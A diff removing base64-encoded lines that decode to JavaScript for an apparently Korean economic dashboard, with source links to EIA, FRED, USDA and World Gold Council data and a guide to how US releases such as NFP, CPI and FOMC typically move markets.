-"cy9zdGVvLycsICAgICAgICAgICAgICBhbGVydExhYmVsOidFSUEgU1RFTyDCtyDri6jquLAg7JeQ64SI",
-"7KeAIOyghOunnScsICAgICAgICAgICAgYWxlcnRVcmw6J2h0dHBzOi8vd3d3LmVpYS5nb3Yvb3V0bG9v",
-"a3Mvc3Rlby8nfSwKICAgICdwYWdlLWdhcyc6ICAgIHtsYWJlbDonRUlBIOqwgOyKpCDso7zqsIQnLCAg",
-"ICAgICB1cmw6J2h0dHBzOi8vd3d3LmVpYS5nb3YvbmF0dXJhbGdhcy93ZWVrbHkvJywgICAgICAgICAg",
-"YWxlcnRMYWJlbDonRUlBIOyynOyXsOqwgOyKpCDso7zqsIQg67O06rOg7IScJywgICAgICAgICAgICAg",
-"ICAgIGFsZXJ0VXJsOidodHRwczovL3d3dy5laWEuZ292L25hdHVyYWxnYXMvd2Vla2x5Lyd9LAogICAg",
-"J3BhZ2UtZ29sZCc6ICAge2xhYmVsOidXb3JsZCBHb2xkIENvdW5jaWwnLCB1cmw6J2h0dHBzOi8vd3d3",
-"LmdvbGQub3JnJywgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnRMYWJlbDonV29ybGQgR29s",
-"ZCBDb3VuY2lsIMK3IOq4iCDsi5zsnqUg64+Z7ZalJywgICAgICAgYWxlcnRVcmw6J2h0dHBzOi8vd3d3",
-"LmdvbGQub3JnJ30sCiAgICAncGFnZS1zcDUwMCc6ICB7bGFiZWw6J0ZSRUQgU1A1MDAnLCAgICAgICAg",
-"IHVybDonaHR0cHM6Ly9mcmVkLnN0bG91aXNmZWQub3JnJywgICAgICAgICAgICAgICAgICAgIGFsZXJ0",
-"TGFiZWw6J0ZSRUQgwrcgUyZQNTAwIOyLnOqzhOyXtCcsICAgICAgICAgICAgICAgICAgICBhbGVydFVy",
-"bDonaHR0cHM6Ly9mcmVkLnN0bG91aXNmZWQub3JnJ30sCiAgICAncGFnZS10MTB5JzogICB7bGFiZWw6",
-"J0ZSRUQgREdTMTAnLCAgICAgICAgIHVybDonaHR0cHM6Ly9mcmVkLnN0bG91aXNmZWQub3JnL3Nlcmll",
-"cy9ER1MxMCcsICAgICAgIGFsZXJ0TGFiZWw6J0ZSRUQgREdTMTAgwrcgMTDrhYQg6rWt7LGEIOyImOyd",
-"teuloCcsICAgICAgICAgICBhbGVydFVybDonaHR0cHM6Ly9mcmVkLnN0bG91aXNmZWQub3JnL3Nlcmll",
-"cy9ER1MxMCd9LAogICAgJ3BhZ2UtYXVkJzogICAge2xhYmVsOidGUkVEIERFWFVTQUwnLCAgICAgICB1",
-"cmw6J2h0dHBzOi8vZnJlZC5zdGxvdWlzZmVkLm9yZy9zZXJpZXMvREVYVVNBTCcsICAgICBhbGVydExh",
-"YmVsOidGUkVEIERFWFVTQUwgwrcg7Zi47KO864us65+sIOyLnOqzhOyXtCcsICAgICAgICAgIGFsZXJ0",
-"VXJsOidodHRwczovL2ZyZWQuc3Rsb3Vpc2ZlZC5vcmcvc2VyaWVzL0RFWFVTQUwnfSwKICAgICdwYWdl",
-"LXNveSc6ICAgIHtsYWJlbDonVVNEQSBXQVNERScsICAgICAgICAgdXJsOidodHRwczovL3d3dy51c2Rh",
-"Lmdvdi9vY2UvY29tbW9kaXR5L3dhc2RlLycsICAgICAgYWxlcnRMYWJlbDonVVNEQSBXQVNERSDCtyDs",
-"hLjqs4Qg64aN7JeFIOyImOq4iSDsoITrp50nLCAgICAgICAgYWxlcnRVcmw6J2h0dHBzOi8vd3d3LnVz",
-"ZGEuZ292L29jZS9jb21tb2RpdHkvd2FzZGUvJ30sCiAgICAncGFnZS1uYXNkYXEnOiB7bGFiZWw6J0ZS",
-"RUQgTkFTREFRQ09NJywgICAgIHVybDonaHR0cHM6Ly9mcmVkLnN0bG91aXNmZWQub3JnJywgICAgICAg",
-"ICAgICAgICAgICAgIGFsZXJ0TGFiZWw6J0ZSRUQgTkFTREFRQ09NIMK3IOuCmOyKpOuLpSDsi5zqs4Ts",
-"l7QnLCAgICAgICAgICBhbGVydFVybDonaHR0cHM6Ly9mcmVkLnN0bG91aXNmZWQub3JnJ30sCiAgICAn",
-"cGFnZS1ldXJvZngnOiB7bGFiZWw6J0ZSRUQgREVYVVNFVScsICAgICAgIHVybDonaHR0cHM6Ly9mcmVk",
-"LnN0bG91aXNmZWQub3JnL3Nlcmllcy9ERVhVU0VVJywgICAgIGFsZXJ0TGFiZWw6J0ZSRUQgREVYVVNF",
-"VSDCtyBFVVIvVVNEIOyLnOqzhOyXtCcsICAgICAgICAgICBhbGVydFVybDonaHR0cHM6Ly9mcmVkLnN0",
-"bG91aXNmZWQub3JnL3Nlcmllcy9ERVhVU0VVJ30sCiAgICAncGFnZS1qcHknOiAgICB7bGFiZWw6J0ZS",
-"RUQgREVYSlBVUycsICAgICAgIHVybDonaHR0cHM6Ly9mcmVkLnN0bG91aXNmZWQub3JnL3Nlcmllcy9E",
-"RVhKUFVTJywgICAgIGFsZXJ0TGFiZWw6J0ZSRUQgREVYSlBVUyDCtyBVU0QvSlBZIOyLnOqzhOyXtCcs",
-"ICAgICAgICAgICBhbGVydFVybDonaHR0cHM6Ly9mcmVkLnN0bG91aXNmZWQub3JnL3Nlcmllcy9ERVhK",
-"UFVTJ30sCiAgICAncGFnZS1jb3JuJzogICB7bGFiZWw6J1VTREEgV0FTREUnLCAgICAgICAgIHVybDon",
-"aHR0cHM6Ly93d3cudXNkYS5nb3Yvb2NlL2NvbW1vZGl0eS93YXNkZS8nLCAgICAgIGFsZXJ0TGFiZWw6",
-"J1VTREEgV0FTREUgwrcg7IS46rOEIOuGjeyXhSDsiJjquIkg7KCE66edJywgICAgICAgIGFsZXJ0VXJs",
-"OidodHRwczovL3d3dy51c2RhLmdvdi9vY2UvY29tbW9kaXR5L3dhc2RlLyd9LAogICAgJ3BhZ2Utd2hl",
-"YXQnOiAge2xhYmVsOidVU0RBIFdBU0RFJywgICAgICAgICB1cmw6J2h0dHBzOi8vd3d3LnVzZGEuZ292",
-"L29jZS9jb21tb2RpdHkvd2FzZGUvJywgICAgICBhbGVydExhYmVsOidVU0RBIFdBU0RFIMK3IOyEuOqz",
-"hCDrho3sl4Ug7IiY6riJIOyghOunnScsICAgICAgICBhbGVydFVybDonaHR0cHM6Ly93d3cudXNkYS5n",
-"b3Yvb2NlL2NvbW1vZGl0eS93YXNkZS8nfQogIH07CiAgT2JqZWN0LmVudHJpZXMobWFwKS5mb3JFYWNo",
-"KChbcGlkLHNyY10pPT57CiAgICBjb25zdCBwYWdlPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHBpZCk7",
-"CiAgICBpZighcGFnZSlyZXR1cm47CgogICAgLy8gZmFjdG9yLWltcGFjdCArIGNhbC1pbXBhY3Qg7Lac",
-"7LKYIOunge2BrAogICAgY29uc3QgbWtMaW5rPSgpPT57Y29uc3QgYT1kb2N1bWVudC5jcmVhdGVFbGVt",
-"ZW50KCdhJyk7YS5ocmVmPXNyYy51cmw7YS50YXJnZXQ9J19ibGFuayc7YS5jbGFzc05hbWU9J2ZpLWxp",
-"bmsnO2EudGV4dENvbnRlbnQ9c3JjLmxhYmVsKycg4oaSJztyZXR1cm4gYTt9OwogICAgcGFnZS5xdWVy",
-"eVNlbGVjdG9yQWxsKCcuZmFjdG9yLWltcGFjdCcpLmZvckVhY2goZWw9PntpZighZWwucXVlcnlTZWxl",
-"Y3RvcignLmZpLWxpbmsnKSllbC5hcHBlbmRDaGlsZChta0xpbmsoKSk7fSk7CiAgICBwYWdlLnF1ZXJ5",
-"U2VsZWN0b3JBbGwoJy5jYWwtaW1wYWN0JykuZm9yRWFjaChlbD0+e2lmKCFlbC5xdWVyeVNlbGVjdG9y",
-"KCcuZmktbGluaycpKWVsLmFwcGVuZENoaWxkKG1rTGluaygpKTt9KTsKCiAgICAvLyBhbGVydC1iYW5u",
-"ZXIg7Lac7LKYIOunge2BrCAo7ZWY64uoKQogICAgY29uc3QgYmFubmVyPXBhZ2UucXVlcnlTZWxlY3Rv",
-"cignLmFsZXJ0LWJhbm5lcicpOwogICAgaWYoYmFubmVyJiYhYmFubmVyLnF1ZXJ5U2VsZWN0b3IoJy5h",
-"bGVydC1zcmMnKSl7CiAgICAgIC8vIGFsZXJ0LXRleHTrpbwgaW5uZXIgd3JhcHBlcuuhnCDqsJDsi7jq",
-"uLAKICAgICAgY29uc3QgdGV4dEVsPWJhbm5lci5xdWVyeVNlbGVjdG9yKCcuYWxlcnQtdGV4dCcpOwog",
-"ICAgICBpZih0ZXh0RWwpewogICAgICAgIGxldCBpbm5lcj1iYW5uZXIucXVlcnlTZWxlY3RvcignLmFs",
-"ZXJ0LWJhbm5lci1pbm5lcicpOwogICAgICAgIGlmKCFpbm5lcil7CiAgICAgICAgICBpbm5lcj1kb2N1",
-"bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICAgIGlubmVyLmNsYXNzTmFtZT0nYWxlcnQt",
-"YmFubmVyLWlubmVyJzsKICAgICAgICAgIGJhbm5lci5pbnNlcnRCZWZvcmUoaW5uZXIsdGV4dEVsKTsK",
-"ICAgICAgICAgIGlubmVyLmFwcGVuZENoaWxkKHRleHRFbCk7CiAgICAgICAgfQogICAgICAgIGNvbnN0",
-"IHNyY0Rpdj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzcGFuJyk7CiAgICAgICAgc3JjRGl2LmNsYXNz",
-"TmFtZT0nYWxlcnQtc3JjJzsKICAgICAgICBzcmNEaXYuaW5uZXJIVE1MPSfstpzsspg6IDxhIGhyZWY9",
-"Iicrc3JjLmFsZXJ0VXJsKyciIHRhcmdldD0iX2JsYW5rIj4nK3NyYy5hbGVydExhYmVsKycg4oaSPC9h",
-"Pic7CiAgICAgICAgaW5uZXIuYXBwZW5kQ2hpbGQoc3JjRGl2KTsKICAgICAgfQogICAgfQogIH0pOwp9",
-"Cgp3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsKCk9PnsKICAvLyAxLiDt",
-"j7TrsLEg642w7J207YSwIOymieyLnCDsoIHsmqkKICBhcHBseUZhbGxiYWNrKCk7CgogIC8vIDIuIOyw",
-"qO2KuMK36re46528642w7J207IWYwrfrp4Htgawg4oCUIEFQSeyZgCDsmYTsoIQg67aE66as7ZW07ISc",
-"IOymieyLnCDsi6TtlokKICBzZXRUaW1lb3V0KCgpPT57CiAgICB0cnkgeyBidWlsZEFsbENoYXJ0cygn",
-"b2lsJyk7IH0gY2F0Y2goZSl7IGNvbnNvbGUud2FybignY2hhcnQgZXJyb3InLGUpOyB9CiAgICB0cnkg",
-"eyBhcHBseVNlYXNvbkJhckdyYWRpZW50KCk7IH0gY2F0Y2goZSl7IGNvbnNvbGUud2FybignZ3JhZGll",
-"bnQgZXJyb3InLGUpOyB9CiAgICB0cnkgeyBhZGRTb3VyY2VMaW5rcygpOyB9IGNhdGNoKGUpeyBjb25z",
-"b2xlLndhcm4oJ2xpbmtzIGVycm9yJyxlKTsgfQogIH0sIDE1MCk7CgogIC8vIDMuIOqxsOyLnCDsp4Dt",
-"kZwg7Iqk7Yq466a9IOKAlCDsi6TtjKjtlbTrj4Qg64uk66W4IOq4sOuKpeyXkCDsmIHtlqUg7JeG64+E",
-"66GdIOyZhOyghCDqsqnrpqwKICBzZXRUaW1lb3V0KCgpPT57CiAgICBsb2FkTWFjcm9TdHJpcCgpLmNh",
-"dGNoKGU9PmNvbnNvbGUud2FybignbWFjcm8gc3RyaXAgc2tpcHBlZDonLGUpKTsKICB9LCA1MDApOwoK",
-"ICAvLyA0LiDshYvsl4Ug7Jik67KE66CI7J20IOyymOumrAogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlk",
-"KCdzZXR1cC1vdmVybGF5Jykuc3R5bGUuZGlzcGxheT0nbm9uZSc7CiAgZG9jdW1lbnQuZ2V0RWxlbWVu",
-"dEJ5SWQoJ25vdGljZS1mYWxsYmFjaycpLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsKICBzdGFydENvdW50",
-"ZG93bigpOwoKICAvLyA1LiBBUEkg7YKkIOyeiOycvOuptCDsi6Tsi5zqsIQg66Gc65OcCiAgaWYoZ2V0",
-"S2V5KCdFSUEnKXx8Z2V0S2V5KCdGUkVEJykpewogICAgbG9hZEFsbERhdGEoKS5jYXRjaChlPT5jb25z",
-"b2xlLndhcm4oJ0FQSSBsb2FkIGVycm9yOicsZSkpOwogIH0KfSk7CgoKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ",
-"4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
-"4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
-"4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCi8vIEVDT05PTUlDIENBTEVOREFSICsgQ09VTlRET1dOIEVOR0lORSB2",
-"NgovLyDimIUg7J6Q7IKw67OEIOyYge2WpSDqsIDsnbTrk5wg7Y+s7ZWoCi8vIOKYhSDsi5zqsIQgS1NU",
-"IOq4sOykgCAvIGFjdHVhbD0nJyDsnbTrqbQg7Lm07Jq07Yq464uk7Jq0IOuMgOyDgQovLyDilZDilZDi",
-"lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
-"lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
-"lZDilZDilZDilZDilZDilZDilZDilZDilZAKCi8vIOKUgOKUgOKUgCDsnpDsgrDrs4Qg7JiB7ZalIOqw",
-"gOydtOuTnCBEQiDilIDilIDilIAKLy8gZ3VpZGVfa2V5IOuhnCDsnbTrsqTtirjsmYAg7Jew6rKwCnZh",
-"ciBFVkVOVF9HVUlERVMgPSB7CgogIC8vIOuvuOq1rQogICduZnAnOiB7CiAgICBkZXNjOiAn66ek7JuU",
-"IOyyq+ynuCDquIjsmpTsnbwg67Cc7ZGcLiDrr7jqta0g6rOg7Jqp7Iuc7J6l7J2YIOqxtOqwlSDsg4Ht",
-"g5zrpbwg6rCA7J6lIOyngeygkeyggeycvOuhnCDrs7Tsl6zso7zripQg7KeA7ZGc66GcLCBGZWQg6riI",
-"66asIOygleyxheydmCDtlbXsi6wg7YyQ64uoIOq3vOqxsC4g7ISc7ZSE65287J207KaIIOyLnCDsmbjt",
-"mZjCt+yxhOq2jMK37KO87IudIOyghCDsnpDsgrDsl5Ag64+Z7IucIOy2qeqyqS4nLAogICAgYXNzZXRz",
-"OiBbCiAgICAgIHtuYW1lOifri6zrn6woRFhZKScsICB1cDon4payIOqwleyEuCcsICAgIGRvd246J+KW",
-"vCDslb3shLgnfSwKICAgICAge25hbWU6J+q4iCcsICAgICAgICAgdXA6J+KWvCDtlZjrnb0g7JWV66Cl",
-"JywgZG93bjon4payIOyDgeyKuSd9LAogICAgICB7bmFtZTonUyZQIDUwMCcsICAgIHVwOiftmLzsobAn",
-"LCAgICAgICAgZG93bjon4pa8IO2VmOudvSd9LAogICAgICB7bmFtZTon64KY7Iqk64ulJywgICAgIHVw",
-"OiftmLzsobAnLCAgICAgICAgZG93bjon4pa8IO2VmOudvSd9LAogICAgICB7bmFtZTonMTDrhYQg6riI",
-"66asJywgIHVwOifilrIg7IOB7Iq5JywgICAgIGRvd246J+KWvCDtlZjrnb0nfSwKICAgICAge25hbWU6",
-"J1dUSSDsm5DsnKAnLCAgIHVwOifqsITsoJHihpEnLCAgICAgIGRvd246J+qwhOygkeKGkyd9LAogICAg",
-"XSwKICAgIG5vdGU6ICfqs6DsmqnsnbQg6rCV7ZWg7IiY66GdIEZlZCDquIjrpqwg7J247ZWYIOq4sOuM",
-"gOqwgCDtm4Tth7TtlbQg64us65+swrfquIjrpqwg7IOB7Iq5LCDquIjCt+yxhOq2jCDtlZjrnb0g7JWV",
-"66ClLiDri6gsIOqyveq4sCDrgpnqtIDsnLzroZwg7KO87Iud7J2AIO2YvOyhsCDrsJjsnZHsnbQg7J28",
-"67CY7KCBLiDsmIjsg4Eg64yA67mEIO2BrOqyjCDsg4HtmoztlZjrqbQgIuq4iOumrCDrj5nqsrAg7J6l",
-"6riw7ZmUIiDsmrDroKTroZwg7ISx7J6l7KO87JeQIOyVheyerC4nCiAgfSwKCiAgJ2FkcCc6IHsKICAg",
-"IGRlc2M6ICdORlAg7J207YuAIOyghCDrsJztkZzrkJjripQg66+86rCEIOqzoOyaqSDshKDtlokg7KeA",
-"7ZGcLiDsi6TsoJwgTkZQ7JmAIOq0tOumrOqwgCDtgazsp4Drp4wg67Cp7Zal7ISxIO2ejO2KuOuhnCDt",
-"mZzsmqkuIOuLqOuPheycvOuhnOuKlCDrsJjsnZEg7KCc7ZWc7KCBLCBORlAg7KCEIO2PrOyngOyFmCDs",
-"obDsoJUg7LC46rOg7JqpLicsCiAgICBhc3NldHM6IFsKICAgICAge25hbWU6J+uLrOufrChEWFkpJywg",
-"IHVwOifilrIg7IaM7Y+tIOqwleyEuCcsIGRvd246J+KWvCDshoztj60g7JW97IS4J30sCiAgICAgIHtu",
-"YW1lOifquIgnLCAgICAgICAgIHVwOifilrwg7IaM7Y+tIO2VmOudvScsICBkb3duOifilrIg7IaM7Y+t",
-"IOyDgeyKuSd9LAogICAgICB7bmFtZTonUyZQIDUwMCcsICAgIHVwOifspJHrpr1+7IaM7Y+tIOKGkScs",
-"IGRvd246J+ykkeumvX7shoztj60g4oaTJ30sCiAgICAgIHtuYW1lOicxMOuFhCDquIjrpqwnLCAgdXA6",
-"J+KWsiDshoztj60g7IOB7Iq5JywgZG93bjon4pa8IOyGjO2PrSDtlZjrnb0nfSwKICAgIF0sCiAgICBu",
-"b3RlOiAnTkZQ7J2YIOyEoO2WiSDsp4DtkZzroZwg7Zmc7Jqp65CY7KeA66eMIOyDgeq0gOq0gOqzhOqw",
-"gCDrgq7slYQg7Iuc7J6lIOuwmOydkeydgCDsoJztlZzsoIEuIOyjvOuhnCBORlAg67Cp7Zal7ISxIOqw",
-"gOuKoOyaqeycvOuhnCDssLjqs6AuIOuLqOuPheycvOuhnCDtgbAg67Cp7Zal7J2EIOuwlOq+uOq4sOuz",
-"tOuLqCDquLDsobQg67aE7JyE6riw66W8IOqwle2ZlO2VmOuKlCDsl63tlaAuJwogIH0sCgogICdjcGkn",
-"OiB7CiAgICBkZXNjOiAn7IaM67mE7J6QIOusvOqwgCDsg4HsirnrpaAuIEZlZOqwgCDqsIDsnqUg7KSR",
-"7Iuc7ZWY64qUIOyduO2UjOugiOydtOyFmCDsspnrj4Qg7KSRIO2VmOuCmC4gMiUg66qp7ZGcIOuMgOu5",
-"hCDsiJjsuZjsl5Ag65Sw6528IOq4iOumrCDsnbjtlZjCt+uPmeqysMK37J247IOBIOq4sOuMgOqwgCDs",
-"ponqsIEg67CY7J2RLiDrgpjsiqTri6Ug67OA64+Z7ISx7J20IOqwgOyepSDtgbwuJywKICAgIGFzc2V0",
-"czogWwogICAgICB7bmFtZTon64us65+sKERYWSknLCAgdXA6J+KWsiDqsJXshLgnLCAgICAgZG93bjon",
-"4pa8IOyVveyEuCd9LAogICAgICB7bmFtZTon6riIJywgICAgICAgICB1cDon4pa8IO2VmOudvScsICAg",
-"ICAgZG93bjon4payIOyDgeyKuSd9LAogICAgICB7bmFtZTonUyZQIDUwMCcsICAgIHVwOifilrwg7ZWY",
-"6529JywgICAgICBkb3duOifilrIg7IOB7Iq5J30sCiAgICAgIHtuYW1lOifrgpjsiqTri6UnLCAgICAg",
-"dXA6J+KWvCDtlZjrnb0o7ISx7J6l7KO8IO2DgOqyqSknLCBkb3duOifilrIg7IOB7Iq5J30sCiAgICAg",
-"IHtuYW1lOicxMOuFhCDquIjrpqwnLCAgdXA6J+KWsiDsg4HsirknLCAgICAgZG93bjon4pa8IO2VmOud",
-"vSd9LAogICAgICB7bmFtZTonV1RJIOybkOycoCcsICAgdXA6J+uzte2VqSDsmIHtlqUnLCAgIGRvd246",
-"J+KWvCDsiJjsmpQg7Jqw66CkJ30sCiAgICBdLAogICAgbm90ZTogJ+yYiOyDgeuztOuLpCDrhpLsnYAg",
-"Q1BJ64qUIOyduO2UjOugiOydtOyFmCDsp4Dsho0g7Iug7Zi466GcIOq4iOumrCDsnbjtlZgg6riw64yA",
-"66W8IOq6vuyWtCDshLHsnqXso7zCt+yxhOq2jOyXkCDslYXsnqwuIOuwmOuMgOuhnCDrgq7snYAgQ1BJ",
-"64qUIOyduO2VmCDquLDrjIAg6rCV7ZmU66GcIOymneyLnMK37LGE6raMIOqwleyEuC4g7Yq57Z6IIOuC",
-"mOyKpOuLpeydgCDquIjrpqwg66+86rCQ64+E6rCAIOuGkuyVhCDrs4Drj5nshLHsnbQg6rCA7J6lIO2B",
-"vC4nCiAgfSwKCiAgJ3BwaSc6IHsKICAgIGRlc2M6ICfsg53sgrDsnpAo6riw7JeFKSDri6jqs4TsnZgg",
-"66y86rCAIOyVleugpSDsuKHsoJUuIENQSeyXkCAxfjPqsJzsm5Qg7ISg7ZaJ7ZWY64qUIO2KueyEsS4g",
-"6riw7JeFIOuniOynhCDslZXrsJUg4oaSIOyGjOu5hOyekOqwgOqyqSDsoITqsIAg7Jes67aAIO2MkOuL",
-"qOyXkCDtmZzsmqkuIENQSSDsoITrgqAg67Cc7ZGc66GcIOyYiOqzoCDtmqjqs7wuJywKICAgIGFzc2V0",
-"czogWwogICAgICB7bmFtZTon64us65+sKERYWSknLCAgdXA6J+KWsiDshoztj60g6rCV7IS4JywgZG93",
-"bjon4pa8IOyGjO2PrSDslb3shLgnfSwKICAgICAge25hbWU6J+q4iCcsICAgICAgICAgdXA6J+KWvCDt",
-"lZjrnb0nLCAgICAgICBkb3duOifilrIg7IOB7Iq5J30sCiAgICAgIHtuYW1lOidTJlAgNTAwJywgICAg",
-"dXA6J+KWvCDshoztj60g7ZWY6529JywgIGRvd246J+KWsiDshoztj60g7IOB7Iq5J30sCiAgICAgIHtu",
-"YW1lOicxMOuFhCDquIjrpqwnLCAgdXA6J+KWsiDsg4HsirknLCAgICAgIGRvd246J+KWvCDtlZjrnb0n",
-"fSwKICAgIF0sCiAgICBub3RlOiAnUFBJ64qUIOyDneyCsOyekCDrrLzqsIDroZwgQ1BJ7J2YIOyEoO2W",
-"iSDsp4DtkZwg7Jet7ZWgLiDsmIjsg4Eg7IOB7ZqMIOyLnCDtlqXtm4Qg7IaM67mE7J6QIOusvOqwgCDs",
-"g4Hsirkg7Jqw66Ck66GcIOyLnOyepSDrsJjsnZEuIENQSeuztOuLpCDsmIHtlqUg6rCV64+E64qUIOye",
-"keyngOunjCDsnbjtlIzroIjsnbTshZgg7Z2Q66aEIO2MkOuLqOydmCDspJHsmpQg642w7J207YSwLicK",
-"ICB9LAoKICAnZm9tYyc6IHsKICAgIGRlc2M6ICfsl7DqsIQgOO2ajCDqsJzstZwuIOq4sOykgOq4iOum",
-"rCDqsrDsoJUgKyDsoJDrj4TtkZwgKyDtjIzsm5Qg6riw7J6Q7ZqM6rKs7J2YIDPspJEg7J2067Kk7Yq4",
-"LiDquIjrpqwg67Cp7Zal67O064ukICLtlqXtm4Qg6rK966GcIiDsi5zsgqzqsIAg642UIOykkeyalC4g",
-"67Cc7ZGcIOyghO2bhCDsoIQg7J6Q7IKwIOuzgOuPmeyEsSDqt7nrjIDtmZQuJywKICAgIGFzc2V0czog",
-"WwogICAgICB7bmFtZTon64us65+sKERYWSknLCAgdXA6J+KWsiDqsJXshLgo66ek7YyMKScsIGRvd246",
-"J+KWvCDslb3shLgo67mE65GY6riwKSd9LAogICAgICB7bmFtZTon6riIJywgICAgICAgICB1cDon4pa8",
-"IO2VmOudvScsICAgICAgICAgZG93bjon4payIOyDgeyKuSd9LAogICAgICB7bmFtZTonUyZQIDUwMCcs",
-"ICAgIHVwOifilrwg7ZWY6529JywgICAgICAgICBkb3duOifilrIg7IOB7Iq5J30sCiAgICAgIHtuYW1l",
-"OifrgpjsiqTri6UnLCAgICAgdXA6J+KWvCDtlZjrnb0o6riI66as66+86rCQKScsIGRvd246J+KWsiDs",
-"g4HsirknfSwKICAgICAge25hbWU6JzEw64WEIOq4iOumrCcsICB1cDon4payIOyDgeyKuScsICAgICAg",
-"ICAgZG93bjon4pa8IO2VmOudvSd9LAogICAgICB7bmFtZTonV1RJIOybkOycoCcsICAgdXA6J+KWvCDs",
-"iJjsmpQg7Jqw66CkJywgICAgZG93bjon4payIOyImOyalCDquLDrjIAnfSwKICAgIF0sCiAgICBub3Rl",
-"OiAn6riI66asIOuPmeqysMK37J247ZWYIOyXrOu2gOuztOuLpCDtlqXtm4Qg6rK966GcKOygkOuPhO2R",
-"nMK37YyM7JuUIOuwnOyWuCnqsIAg642UIOykkeyalC4gIuunpO2MjOyggSDrj5nqsrAi7J2066m0IOyj",
-"vOyLnSDtlZjrnb0sICLruYTrkZjquLDsoIEg64+Z6rKwIuydtOuptCDsg4HsirkuIOuwnO2RnCDsp4Ht",
-"m4Qg67OA64+Z7ISx7J20IOunpOyasCDtgazrqbAg67O07Ya1IO2MjOyblCDquLDsnpDtmozqsqzsnbQg",
-"7Iuk7KCcIOuwqe2WpeydhCDqsrDsoJUuJwogIH0sCgogICdnZHAnOiB7CiAgICBkZXNjOiAn66+46rWt",
-"IOqyveygnOyEseyepeuloC4g7IaN67O07LmY4oaS7JiI67mE7LmY4oaS7ZmV7KCV7LmYIOyInCDrsJzt",
-"kZwuIOqwle2VnCDshLHsnqXsnYAg6riw7JeF7J207J21IOq4sOuMgOuhnCDso7zsi50g6rCV7IS47J20",
-"64KYLCDqs7zsl7Qg7IucIOq4iOumrCDsnbjsg4Eg7Jqw66Ck64+EIOuPmeuwmC4g6rK96riwIOyCrOyd",
-"tO2BtCDsoITtmZgg7YyQ64uo7J2YIOq4sOykgC4nLAogICAgYXNzZXRzOiBbCiAgICAgIHtuYW1lOifr",
-"i6zrn6woRFhZKScsICB1cDon4payIOqwleyEuCcsICAgICAgZG93bjon4pa8IOyVveyEuCd9LAogICAg",
-"ICB7bmFtZTon6riIJywgICAgICAgICB1cDon7KSR66a9fuyGjO2PrSDihpMnLCBkb3duOifilrIg7JWI",
-"7KCE7J6Q7IKwJ30sCiAgICAgIHtuYW1lOidTJlAgNTAwJywgICAgdXA6J+KWsiDsg4HsirknLCAgICAg",
-"ICBkb3duOifilrwg7ZWY6529J30sCiAgICAgIHtuYW1lOicxMOuFhCDquIjrpqwnLCAgdXA6J+KWsiDs",
-"g4HsirknLCAgICAgICBkb3duOifilrwg7ZWY6529J30sCiAgICAgIHtuYW1lOidXVEkg7JuQ7JygJywg",
-"ICB1cDon4payIOyImOyalCDquLDrjIAnLCAgZG93bjon4pa8IOyImOyalCDsmrDroKQnfSwKICAgIF0s",
-"CiAgICBub3RlOiAn6rK97KCc7ISx7J6lIOyGjeuPhOulvCDrgpjtg4DrgrTripQg7ZW17IusIOyngO2R",
-"nC4g6rCV7ZWcIEdEUOuKlCDshozruYTCt+q4sOyXheydtOydtSDspp3qsIAg6riw64yA66GcIOyjvOyL",
-"ncK364us65+sIOqwleyEuC4g64uoIOyEseyepeydtCDrhIjrrLQg6rCV7ZWY66m0ICLqs7zsl7Qg4oaS",
-"IOy2lOqwgCDquIjrpqwg7J247IOBIiDsmrDroKTroZwg7LGE6raM7JeQ64qUIOyVheyerC4g7IaN67O0",
-"7LmYIOKGkiDsmIjruYTsuZgg4oaSIO2Zleygley5mCDsiJzshJzroZwg67Cc7ZGcLicKICB9LAoKICAn",
-"cGNlJzogewogICAgZGVzYzogJ0ZlZCDqs7Xsi50g7J247ZSM66CI7J207IWYIOuqqe2RnCDsp4DtkZwu",
-"IENQSeuztOuLpCDshozruYQg7ZaJ64+ZIOuzgO2ZlOulvCDrjZQg7KCV6rWQ7ZWY6rKMIOuwmOyYgS4g",
-"6re87JuQIFBDRSjsi53tkojCt+yXkOuEiOyngCDsoJzsmbgp6rCAIO2VteyLrC4gRk9NQyDsoIQg66eI",
-"7KeA66eJIOyjvOyalCDrjbDsnbTthLDroZwg6riI66asIOqyveuhnOulvCDtmZXsnbguJywKICAgIGFz",
-"c2V0czogWwogICAgICB7bmFtZTon64us65+sKERYWSknLCAgdXA6J+KWsiDqsJXshLgnLCAgICBkb3du",
-"Oifilrwg7JW97IS4J30sCiAgICAgIHtuYW1lOifquIgnLCAgICAgICAgIHVwOifilrwg7ZWY6529Jywg",
-"ICAgIGRvd246J+KWsiDsg4HsirknfSwKICAgICAge25hbWU6J1MmUCA1MDAnLCAgICB1cDon4pa8IO2V",
-"mOudvScsICAgICBkb3duOifilrIg7IOB7Iq5J30sCiAgICAgIHtuYW1lOicxMOuFhCDquIjrpqwnLCAg",
-"dXA6J+KWsiDsg4HsirknLCAgICBkb3duOifilrwg7ZWY6529J30sCiAgICBdLAogICAgbm90ZTogJ0Zl",
-"ZOqwgCDqs7Xsi50g7J247ZSM66CI7J207IWYIOuqqe2RnOuhnCDsgrzripQg7KeA7ZGc66GcIENQSeuz",
-"tOuLpCDrjZQg7KSR7JqULiDqt7zsm5AgUENFKOyLne2SiMK37JeQ64SI7KeAIOygnOyZuCnqsIAg7ZW1",
-"7IusLiAyJSDrqqntkZzrpbwg7KeA7IaNIOyDge2ajO2VmOuptCDquIjrpqwg7J247ZWYIOq4sOuMgOqw",
-"gCDqur7snoQuIOyLnOyepSDrsJjsnZEg6rCV64+E64qUIENQSeyZgCDruYTsirftlZjqsbDrgpgg642U",
